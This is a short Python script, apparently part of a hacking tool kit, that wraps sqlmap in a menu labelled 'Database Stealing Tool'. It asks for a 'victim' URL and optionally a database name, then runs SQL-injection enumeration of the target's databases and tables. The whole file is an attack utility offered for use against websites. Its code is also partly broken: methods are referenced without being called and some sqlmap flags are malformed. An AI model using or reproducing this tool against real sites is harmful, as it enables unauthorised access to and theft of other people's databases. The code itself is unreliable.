import os , time 
from client.client import client
from client.text_color import color

def main():
    
    client().system("clear")

    client().system(f"figlet Database Stealing\n")

    client().puts(f"Welcome to Database Stealing Tool\n\ngithub.com/CryonicsX")

    client().puts(f"""
    
1: Explicit URL
2: Explicit URL and Database Name
3: MENU
    """)

    selection = client().read(f"{color.GREEN}Enter transaction number {color.RESET_ALL} ")

    if selection == "1":
        victim = client().read(f"{color.GREEN}Enter Explicit URL ").lower
        client().puts(f"{color.GREEN}[✔] Starting ...{color.RESET_ALL}")
        time.sleep(2.5)
        client().system(f"sqlmap -u {victim} --dbs --random -agent")

    elif selection == "2":
        victim_url = client().read(f"{color.GREEN}Enter Explicit URL ").lower
        victim_db_name = client().read(f"{color.GREEN}Enter Explicit Database Name ").lower
        client().puts(f"{color.GREEN}[✔] Starting ...{color.RESET_ALL}")
        time.sleep(2.5)
        client().system(f"sqlmap -u {victim_url} -D {victim_db_name} --tables --randomagent")
        

    elif selection == "3":
        client().system("python3 main.py")

    else:
        client().puts(f"{color.RED}[!] No such transaction found{color.RESET_ALL}")

    returnED = client().read(f"{color.GREEN} Do you want to make a new Brute Force?(Y/N) {color.RESET_ALL}").lower()

    if returnED == "y":
        client().system("python3 tools/Database_Stealing_Tool.py")


    elif returnED == "n":
        client().puts(f"""
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
        """)

    else:
        client().puts("There is no such option")

    
    
if __name__ == '__main__' and os.name == 'posix':
    if os.getuid() == 0:
        main()
else:
    client().puts(f"""
    
{color.GREEN}    
█░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀   ▀█▀ █▀█ █▀█ █░░   █▄▀ █ ▀█▀ █▀    Developed by CryonicX & Ref
█▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█   ░█░ █▄█ █▄█ █▄▄   █░█ █ ░█░ ▄█
{color.RESET_ALL}

{color.RED}[!] You can run this script only on debian system.{color.RESET_ALL}

        
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
    """)
